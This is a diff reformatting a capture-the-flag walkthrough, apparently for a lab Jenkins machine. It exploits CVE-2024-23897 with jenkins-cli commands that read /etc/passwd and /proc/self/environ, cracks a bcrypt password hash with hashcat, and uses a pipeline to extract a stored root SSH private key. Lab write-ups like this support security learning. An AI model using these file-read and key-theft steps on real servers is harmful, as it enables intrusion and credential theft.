@@ -50,9 +50,7 @@ OS and Service detection performed. Please report any incorrect results at https
 > - https://pentest-tools.com/vulnerabilities-exploits/jenkins-2441-arbitrary-file-read_23018
 > - https://github.com/P4x1s/CVE-2024-23897
 
-Analyzing the POC, "**@**" causes the Jenkins command line interface (CLI) to load the contents of that file.
-
-- We got the jar file from the **2nd poc** (1st poc didn't give proper results):
+Analyzing the POC, "**@**" causes the Jenkins command line interface (CLI) to load the contents of that file. We got the jar file from the **2nd poc** (1st poc didn't give proper results):
 
 ```sh
 java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/etc/passwd"
@@ -60,7 +58,7 @@ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' he
 
 It fetches just the 1st line.
 
-- Check the `/proc/self/environ` file to see information about the current process:
+Check the `/proc/self/environ` file to see information about the current process:
 
 ```sh
 java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/proc/self/environ"
@@ -88,13 +86,9 @@ PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sb
 
 ```
 
-- Home directory -> `/var/jenkins_home`
-- The hostname seems odd — if it were the actual builder machine it might be `builder.htb`
-- The random strings suggest a docker container
+The home directory is `/var/jenkins_home`. The hostname seems odd — if it were the actual builder machine it might be `builder.htb`, and the random strings suggest a docker container.
 
-With this vulnerability we can only read files — to understand the application, install it and explore.
-
-Install **jenkins version 2.441** on a docker container:
+With this vulnerability we can only read files, so to understand the application, install it and explore. Install **jenkins version 2.441** on a docker container:
 
 ```sh
 docker pull jenkins/jenkins:2.441-jdk17
@@ -104,18 +98,15 @@ docker pull jenkins/jenkins:2.441-jdk17
 docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:2.441-jdk17 
 ```
 
-- Paste the admin password
-- Go with **select plugins to install** for faster installation
-- Create a user if you want
+Paste the admin password, go with **select plugins to install** for faster installation, and create a user if you want.
 
-Once installed, quit the hosting with ctrl+c:
-- now open start and open the docker image in a bash shell:
+Once installed, quit the hosting with ctrl+c, then open start and open the docker image in a bash shell:
 
 ```sh
 docker ps -a
 ```
 
- - Lists all the dockers, even exited ones
+This lists all the dockers, even exited ones.
 
 ```sh
 docker start <container_id>
@@ -125,12 +116,12 @@ docker start <container_id>
 docker exec -it <container_id> bash
 ```
 
-- In the home directory there is a directory called users
-- Inside that directory there are two files:
-	- `admin_RandomString` -> User directory of admin
-	- `users.xml` -> holds the **name** of the **user** directory
+In the home directory there is a directory called users. Inside that directory there are two files:
 
-- Inside the User directory there is a **config.xml** file which holds the password hash of the user:
+- `admin_RandomString` -> User directory of admin
+- `users.xml` -> holds the **name** of the **user** directory
+
+Inside the User directory there is a **config.xml** file which holds the password hash of the user:
 
 ```
 <?xml version='1.1' encoding='UTF-8'?>
@@ -179,20 +170,13 @@ hashcat -m 3200 jenniferhash /usr/share/wordlists/rockyou.txt
 
 Login to **jenkins** using the creds.
 
-Two ways for PrivEsc:
-- To steal the key using the ssh key authorization **plugin** in pipelines
-- To steal the key using the developer tools
+There are two ways for PrivEsc: to steal the key using the ssh key authorization **plugin** in pipelines, or to steal the key using the developer tools.
 
 ### Method 1:
-- Navigate to credentials
 
-There's a **root** user's **ssh private key** stored.
+Navigate to credentials — there's a **root** user's **ssh private key** stored. If you check the **installed plugins**, the **SSH agent plugin** on Builder allows using SSH keys in **pipelines**.
 
-If you check the **installed plugins**, the **SSH agent plugin** on Builder allows using SSH keys in **pipelines**.
-
-Execution:
-- Create a new pipeline
-- In "**advance project options**" use the code to extract the key:
+Execution: create a new pipeline and in "**advance project options**" use the code to extract the key:
 
 ```sh
 pipeline {
@@ -214,6 +198,7 @@ pipeline {
 ```
 
 Jenkins pipeline script (**Groovy syntax**). What it does:
+
 - `pipeline` – Declares a declarative pipeline
 - `agent any` – Runs on any available agent
 - `stages` – Defines the pipeline stages
